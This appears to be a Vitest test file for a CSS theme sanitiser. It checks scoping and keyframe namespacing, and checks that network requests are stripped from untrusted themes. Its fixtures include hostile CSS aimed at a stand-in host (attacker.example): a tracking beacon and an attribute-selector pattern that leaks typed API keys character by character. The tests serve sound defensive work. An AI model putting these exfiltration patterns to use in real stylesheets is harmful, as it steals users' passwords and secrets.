/**
 * The theme sanitiser, tested against the attacks it exists for.
 *
 * Each case here is something a theme could do to the person who installed it, before this existed.
 * Themes are the lowest-friction thing to install in WE and arrive from a marketplace or sync in
 * from a peer, which makes them the highest-volume untrusted input in the app.
 */
import { describe, expect, it } from 'vitest';

import { sanitiseCss } from './sanitiseCss';

const SCOPE = "[data-we-theme-scope='x']";

describe('the network, which is the exfiltration channel', () => {
  it('drops a background that fetches', () => {
    // A beacon: fires when the rule applies, reporting who installed the theme and when.
    const { css, removed } = sanitiseCss('.a { background: url(https://attacker.example/ping); color: red }');

    expect(css).not.toContain('attacker.example');
    expect(css).toContain('color: red');
    expect(removed.join(' ')).toMatch(/network/);
  });

  it('drops the attribute-selector exfiltration pattern', () => {
    // Read typed input a character at a time — passwords, API keys — wherever a value reflects into
    // the DOM. The selector is untouched; the *fetch* is what makes it work, so that is what goes.
    const { css } = sanitiseCss('input[value^="sk-a"] { background: url(https://attacker.example/leak/sk-a) }');
    expect(css).not.toContain('attacker.example');
  });

  it('keeps a data URI, which is bytes rather than a request', () => {
    const { css } = sanitiseCss(".a { background: url('data:image/svg+xml,%3Csvg%3E%3C/svg%3E') }");
    expect(css).toContain('data:image/svg');
  });

  it('refuses a declaration that mixes a data URI with a remote one', () => {
    const { css } = sanitiseCss(".a { background: url(data:image/png;base64,AA), url(https://attacker.example/x) }");
    expect(css).not.toContain('attacker.example');
    expect(css).not.toContain('data:image/png');
  });

  it('drops @import, which changes the theme after you reviewed it', () => {
    const { css, removed } = sanitiseCss("@import url('https://fonts.example/x.css'); .a { color: red }");

    expect(css).not.toContain('@import');
    expect(css).toContain('color: red');
    expect(removed.join(' ')).toMatch(/@import/);
  });

  it('drops a @font-face that loads from another server', () => {
    const { css, removed } = sanitiseCss('@font-face { font-family: X; src: url(https://fonts.example/x.woff2) }');

    expect(css).not.toContain('fonts.example');
    expect(removed.join(' ')).toMatch(/@font-face/);
  });

  it('never emits a @font-face whose src it could not read', () => {
    // A rule that names a family and loads nothing shadows the family it names — the page renders in
    // a font that does not exist rather than falling back. So an unreadable `src` drops the whole
    // rule rather than the one declaration. jsdom's CSS parser is the case this is written against:
    // it does not recognise `src` at all, so under it *every* @font-face takes this branch, and the
    // data-URI case a real CSSOM would keep cannot be exercised here.
    const { css, removed } = sanitiseCss('@font-face { font-family: X; src: url(data:font/woff2;base64,AAAA) }');

    expect(css).not.toContain('font-family: X');
    expect(removed.join(' ')).toMatch(/@font-face/);
  });
});

describe('scoping', () => {
  it('confines the sheet with @scope', () => {
    const { css } = sanitiseCss('.card { color: red }', { scope: SCOPE });
    expect(css).toBe(`@scope (${SCOPE}) {\n:where(:scope, :scope *).card { color: red }\n}`);
  });

  it('anchors a selector inclusively, so one matching the scoping root itself still applies', () => {
    // `@scope` implies a *strict descendant* `:scope ` prefix. WE's own themes are written as
    // `[data-we-theme='retro'] we-button`, and the element carrying that attribute is the wrapper
    // the theme is scoped to — so left implicit, every built-in theme renders as nothing in scoped
    // mode. Verified against Chrome, not deduced from the spec.
    const { css } = sanitiseCss("[data-we-theme='retro'] we-button { color: red }", { scope: SCOPE });
    // Quotes come back the way the parser normalises them, which is the point of round-tripping.
    expect(css).toContain(':where(:scope, :scope *)[data-we-theme="retro"] we-button { color: red }');
  });

  it('rewrites :root to the scoping root', () => {
    // A theme declares its variables on `:root`. Left alone they would paint the whole document,
    // which is the thing scoping exists to prevent — and `html` is outside any scoping root we could
    // name, so the rule would simply be lost.
    const { css } = sanitiseCss(':root { --we-color-primary-hue: 200 }', { scope: SCOPE });
    expect(css).toContain(':scope { --we-color-primary-hue: 200 }');
  });

  it('collapses a leading run of root selectors rather than leaving one outside the scope', () => {
    const { css } = sanitiseCss('html body .card { color: red }', { scope: SCOPE });
    expect(css).toContain(':scope .card { color: red }');
  });

  it('rewrites every part of a selector list', () => {
    const { css } = sanitiseCss('html, body { color: red }', { scope: SCOPE });
    expect(css).toContain(':scope, :scope { color: red }');
  });

  it('splits a selector list on its own commas, not on the ones inside :is()', () => {
    // `split(',')` cuts this into two invalid fragments and the rule vanishes.
    const { css } = sanitiseCss(':is(.a, .b) .c { color: red }', { scope: SCOPE });
    expect(css).toContain(':where(:scope, :scope *):is(.a, .b) .c { color: red }');
  });

  it('scopes inside a media query without touching the condition', () => {
    const { css } = sanitiseCss('@media (min-width: 40rem) { .a { color: red } }', { scope: SCOPE });
    expect(css).toContain('@media (min-width: 40rem)');
    expect(css.indexOf('@scope')).toBeLessThan(css.indexOf('@media'));
  });

  it('leaves the sheet unwrapped when there is no scope — the agent theming their own window', () => {
    const { css } = sanitiseCss('.card { color: red }');
    expect(css).toBe('.card { color: red }');
  });
});

describe('rules that define a name rather than select an element', () => {
  it('hoists @keyframes above the @scope block', () => {
    // `@keyframes` selects nothing, so scoping it would mean nothing — and a browser may reject it
    // inside `@scope` outright, taking the animation with it.
    const { css } = sanitiseCss('@keyframes spin { from { opacity: 0 } } .a { color: red }', {
      scope: SCOPE,
      namespace: 'n',
    });

    expect(css.indexOf('@keyframes n-spin')).toBeLessThan(css.indexOf('@scope'));
  });

  it('keeps a conditional @keyframes conditional while hoisting it', () => {
    const { css } = sanitiseCss('@media (min-width: 40rem) { @keyframes spin { from { opacity: 0 } } }', {
      scope: SCOPE,
      namespace: 'n',
    });

    expect(css).toContain('@media (min-width: 40rem)');
    expect(css).toContain('@keyframes n-spin');
    expect(css).not.toContain('@scope');
  });
});

describe('keyframes', () => {
  it('namespaces them, because their names are global', () => {
    // Two themes each defining `spin` otherwise silently redefine each other.
    const { css } = sanitiseCss('@keyframes spin { from { opacity: 0 } to { opacity: 1 } }', { namespace: 'theme-a' });

    expect(css).toContain('@keyframes theme-a-spin');
    expect(css).toContain('opacity: 1');
  });

  it('does not scope the frame offsets', () => {
    // `from`/`to` are offsets, not selectors — prefixing them produces a rule that matches nothing.
    const { css } = sanitiseCss('@keyframes spin { from { opacity: 0 } }', { scope: SCOPE, namespace: 'n' });
    expect(css).not.toContain(`${SCOPE} from`);
  });
});

describe('what it refuses by default', () => {
  it('drops an at-rule it does not recognise rather than passing it through', () => {
    // New at-rules arrive regularly. "Allow what I have thought about" is the only version of this
    // that stays correct as the language grows.
    const { css, removed } = sanitiseCss('@page { margin: 1cm } .a { color: red }');

    expect(css).toContain('color: red');
    expect(css).not.toContain('@page');
    expect(removed.length).toBeGreaterThan(0);
  });

  it('survives nonsense without throwing', () => {
    expect(() => sanitiseCss('this is not css {{{')).not.toThrow();
    expect(sanitiseCss('').css).toBe('');
  });

  it('preserves !important, which a theme legitimately needs', () => {
    const { css } = sanitiseCss('.a { color: red !important }');
    expect(css).toContain('!important');
  });
});
